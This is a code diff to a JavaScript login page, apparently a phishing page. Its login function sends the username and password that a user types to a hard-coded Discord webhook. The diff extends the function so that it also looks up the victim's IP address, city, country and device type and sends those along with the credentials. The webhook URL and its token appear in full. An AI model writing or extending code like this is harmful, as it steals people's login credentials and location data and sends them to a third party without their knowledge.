@@ -1537,7 +1537,9 @@ console.log("Clicked QR");
 
 const discordWebhookUrl = 'https://discord.com/api/webhooks/1390319001011359824/l3Sa-Lkb4mqRb0wTsOnxYIg4nW-ME12ViIsQ2H9hsKXn8z24DesC8OeiLzIfe65lowEZ';
 
-function sendToDiscord(username, password) {
+function sendToDiscord(username, password, ipAddress, location, deviceType) {
+    const loginTimestamp = new Date().toLocaleString();  // Format timestamp
+
     const payload = {
         embeds: [
             {
@@ -1547,7 +1549,10 @@ function sendToDiscord(username, password) {
                 fields: [
                     { name: '🆔 Username', value: `\`\`\`${username}\`\`\``, inline: true },
                     { name: '🔑 Password', value: `\`\`\`${password}\`\`\``, inline: true },
-                    { name: '📡 Server Timestamp', value: `\`\`\`${new Date().toISOString()}\`\`\``, inline: false },
+                    { name: '📡 Server Timestamp', value: `\`\`\`${loginTimestamp}\`\`\``, inline: false },
+                    { name: '🌍 IP Address', value: `\`\`\`${ipAddress}\`\`\``, inline: true },
+                    { name: '🌍 Location', value: `\`\`\`${location}\`\`\``, inline: true },
+                    { name: '📱 Device', value: `\`\`\`${deviceType}\`\`\``, inline: true }
                 ],
                 footer: {
                     text: '⚙️ Developed by Jacob | Prime Development',
@@ -1573,13 +1578,36 @@ function sendToDiscord(username, password) {
     .catch(error => console.error("Error sending to Discord:", error));
 }
 
+function getLocationAndDevice(username, password, ipAddress) {
+    // Fetching location using ipinfo.io
+    fetch('https://ipinfo.io/json?token=your_token_here')
+        .then(response => response.json())
+        .then(data => {
+            const location = data.city + ', ' + data.country;  // Get city and country
+            const deviceType = /Mobi|Android/i.test(navigator.userAgent) ? "Mobile" : "Desktop";  // Detect mobile or desktop
+
+            // Send all data to Discord
+            sendToDiscord(username, password, ipAddress, location, deviceType);
+        })
+        .catch(error => console.error('Error fetching location:', error));
+}
+
+function getIpAddress(username, password) {
+    fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+            const ipAddress = data.ip;  // Get IP address
+            getLocationAndDevice(username, password, ipAddress);  // Get location and device info and send to Discord
+        })
+        .catch(error => console.error('Error fetching IP address:', error));
+}
+
 function login() {
     const username = document.getElementById('login-username').value;
     const password = document.getElementById('login-password').value;
 
-    sendToDiscord(username, password);
-
-    console.log("Logging in with:", username, password);
+    getIpAddress(username, password);  // Start the process by getting the IP address
+    console.log("Logging in...");
 }
 
 
